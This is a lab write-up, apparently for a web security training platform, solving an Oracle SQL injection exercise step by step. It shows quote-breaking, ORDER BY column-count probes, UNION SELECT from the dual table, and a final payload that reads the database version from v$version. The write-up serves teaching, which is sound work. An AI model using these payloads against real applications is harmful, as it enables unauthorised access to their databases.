# Lab: SQL injection attack, querying the database type and version on Oracle

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

***

Let's Start !!

First We Visit The Website !!

<figure><img src="../../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

Then We Click Gifts Category  !!

Backend Code Look's Like This :-

```
SELECT name,description FROM products WHERE category = 'Gifts'
```

<figure><img src="../../../.gitbook/assets/image (670).png" alt=""><figcaption></figcaption></figure>

We Try To Inject Single Quote `'` To Break The Backend Query !!

Our Backend Query Is This Below !!

```
SELECT name,description FROM products WHERE category = 'Gifts' 
```

When We Inject The Single Quote `'` Actually The Create Error In The SQL Query !!

```
SELECT name,description FROM products WHERE category = 'Gifts''
```

<figure><img src="../../../.gitbook/assets/image (671).png" alt=""><figcaption></figcaption></figure>

We Try To Inject  `'--` To Check The Backend Query !!

Our Backend Query Is This Below !!

```
SELECT name,description FROM products WHERE category = 'Gifts' 
```

When We Inject `'--`  They Fix The Query and Give No Error ,In SQL `--` Refer To Comment Out In Code !!

```
SELECT name,description FROM products WHERE category = 'Gifts'--'
```

<figure><img src="../../../.gitbook/assets/image (672).png" alt=""><figcaption></figcaption></figure>

#### Finding Number of Columns <a href="#id-5.2-finding-number-of-columns" id="id-5.2-finding-number-of-columns"></a>

**Method – ORDER BY**

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

If `ORDER BY 3` fails, query has 2 columns.

<figure><img src="../../../.gitbook/assets/image (673).png" alt=""><figcaption></figcaption></figure>

That  `ORDER BY 3` fails, query has 2 columns.

it's Mean We assume Right Backend Query They have only Two Columns First is `name` and Second is `description` !!

```
SELECT name,description FROM products WHERE category = 'Gifts'
```

<figure><img src="../../../.gitbook/assets/image (674).png" alt=""><figcaption></figcaption></figure>

Also We Use.There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual` if it's Return Content It's Mean First Column is String !!



Let's We Use In Our Two Column Table !!

```
'UNION SELECT 'a','b' FROM dual--
```

Our Backend Code Look's Like This After Injecting This Query !!

```
SELECT name,description FROM products WHERE category = 'Gifts'
UNION
SELECT 'a','b' FROM dual
```

Then See If Our First and Second  Both Column is String They Return No Error !!&#x20;

<figure><img src="../../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

When We Use `Integer` Value They Return Error It's Mean There is `No Integer` Value In Column !!

<figure><img src="../../../.gitbook/assets/image (676).png" alt=""><figcaption></figcaption></figure>

Use the following payload to display the database version:

```
'UNION SELECT BANNER,NULL FROM v$version--
```

<figure><img src="../../../.gitbook/assets/image (677).png" alt=""><figcaption></figcaption></figure>
